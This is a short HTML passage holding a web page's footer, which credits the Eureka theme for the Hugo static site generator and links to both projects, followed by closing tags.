 &middot;  Powered by the <a href="https://github.com/wangchucheng/hugo-eureka" class="hover:text-eureka">Eureka</a> theme for <a href="https://gohugo.io" class="hover:text-eureka">Hugo</a></p>
</div></div>
  </footer>
</body>

</html>